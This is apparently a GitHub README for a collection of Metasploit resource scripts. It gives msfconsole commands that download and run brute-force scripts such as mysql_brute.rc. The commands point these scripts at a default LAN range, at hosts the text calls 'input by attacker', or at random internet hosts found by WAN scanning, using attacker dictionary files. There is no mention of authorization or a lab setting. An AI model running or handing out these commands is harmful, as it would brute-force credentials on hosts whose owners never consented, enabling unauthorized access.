## METASPLOIT RESOURCE FILES

<blockquote>Resource scripts provides an easy way for us to automate repetitive tasks in Metasploit. Conceptually they're just like batch scripts, they contain a set of commands that are automatically and sequentially executed when you load the script in Metasploit. You can create a resource script by chaining together a series of Metasploit console commands or by directly embedding Ruby to do things like call APIs, interact with objects in the database, modules and iterate actions.</blockquote>

**This repository contains various resource files to assiste in exploitation or metasploit database related issues.**<br />
![pic](http://i68.tinypic.com/21ovkfm.jpg)

#### [!] Please read the article about resource scripting [here](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

<br /><br /><br />

#### HOW TO RUN SCRIPTS?

To run resource script at **msfconsole startup** execute the follow command in your terminal:<br />

      msfconsole -r /<absoluct-path-to-script>/<script_name>.rc

To run resource script **inside msfconsole** execute the follow command in msfconsole prompt:

      resource /<absoluct-path-to-script>/<script_name>.rc

To run resource script **inside meterpreter** execute the follow command in meterpreter prompt:

      resource /<absoluct-path-to-script>/<script_name>.rc

To set a **global variable** (erb) and run resource script at **msfconsole startup** execute the follow command:

      msfconsole -q -x 'setg RANDOM_HOSTS true;resource /<absoluct-path-to-script>/<script_name>.rc'

<br /><br /><br />

#### REMARKS:
**Brute force resource scripts deletes my msfconsole database data at exit (delete host list).**<br />

<blockquote>Brute force rc scripts requires the msf database to be empty, thats the reason why the scripts cleans the database<br />at exit, because the next time it runs, if the database contains any hosts the script will run the attacks againts database<br />hosts (old hosts) and not the hosts found by resource script db_nmap scans.</blockquote>

The msfconsole database must be empty (**clean**) at resource script execution (**first-time-run**)

      msfconsole -q -x 'hosts -d;services -d;exit -y'

To continue populating database with scans, just instruct the rc script to not clean db (**optional**)

      msfconsole -q -x 'setg CLEAN false;setg RANDOM_HOSTS true;setg LIMMIT 600;resource /root/brute_force.rc'

To export database contents to database.xml local folder before executing any rc script (**optional | adviced**)

      msfconsole -q -x 'db_export -f xml database.xml;exit -y'

All brute force resource scripts will build one logfile in **/root** directory.

      /root/<resource_script_name>.log

<br /><br /><br />

### USING 'SETG' GLOBAL VARIABLES TO CONFIG RC SCRIPTS

![pic](http://i67.tinypic.com/2wfi88h.png)
**Remark: If the database contains any hosts previous to this scans, then rc script will run attacks againts all hosts in db**<br />

<blockquote>Many of the this brute force rc scripts are written to accept user inputs (setg global variables).<br />This means that users can run this resource scripts in 3 diferent ways:</blockquote>

Execute resource script **( Default scan: 192.168.1.0/24 )**<br />

      msfconsole -r /root/mysql_brute.rc

Instruct the resource script to scan rhosts input by attacker **( Scan: 10.10.10.1 10.10.11.2 )**<br />

      msfconsole -q -x 'setg RHOSTS 10.10.10.1 10.10.11.2;resource /root/mysql_brute.rc'

Instruct the resource script to search in WAN for rhosts with service port open **( Search: WAN for hosts )**<br />

      msfconsole -q -x 'setg RANDOM_HOSTS true;resource /root/mysql_brute.rc'

<br /><br /><br />

> Adicionally to the described settings we can also combine diferent configurations at runtime execution.

Instruct the resource script to search in WAN for rhosts with service port open and limmit the search to 300 rhosts

      msfconsole -q -x 'setg RANDOM_HOSTS true;setg LIMMIT 300;resource /root/mysql_brute.rc'

Instruct the resource script to use attackers dicionary file (absoluct path required)

      msfconsole -q -x 'setg USERPASS_FILE /root/dicionary.txt;resource /root/mysql_brute.rc'

Instruct the resource script to scan rhosts input by attacker, and use the attacker dicionary file 

      msfconsole -q -x 'setg RHOSTS 10.10.10.1 10.10.11.2;setg USERPASS_FILE /root/dicionary.txt;resource /root/mysql_brute.rc'

Instruct the resource script to not clean database at exit, scan WAN for rhosts and limmit search to 600 rhosts

      msfconsole -q -x 'setg CLEAN false;setg RANDOM_HOSTS true;setg LIMMIT 600;resource /root/mysql_brute.rc'

<br /><br /><br />

#### Step-By-Step how to run brute_force.rc script

1º download resource script to **/root** folder<br />

      sudo wget https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/brute_force.rc

2º start postgresql service (**local**)<br />

      sudo service postgresql start

3º clean (**or export**) msfconsole database before runing rc script<br />

      sudo msfconsole -q -x 'hosts -d;services -d;exit -y'

- **OR** export current database to database.xml (local)<br />

      sudo msfconsole -q -x 'db_export -f xml database.xml;exit -y'`<br /><br />

4º run brute_force.rc resource script to search hosts on WAN (**limmit to 300 searchs**)<br />

      sudo msfconsole -q -x 'setg RANDOM_HOSTS true;setg LIMMIT 300;resource /root/brute_force.rc'

<blockquote>Brute force rc scripts requires the msf database to be empty, thats the reason why the scripts cleans the database<br />at exit, because the next time it runs, if the database contains any hosts the script will run the attacks againts database<br />hosts (old hosts) and not the hosts found by resource script db_nmap scans.</blockquote><br />

5º To populate the database with scans, just instruct the rc script to not clean db (**optional | not-adviced**)<br />

      sudo msfconsole -q -x 'setg CLEAN false;setg RANDOM_HOSTS true;setg LIMMIT 600;resource /root/brute_force.rc'

6º To export database contents to database.xml local folder (**optional**)<br />

      msf > db_export -f xml database.xml

### Suspicious Shell Activity RedTeam @2019

<br />

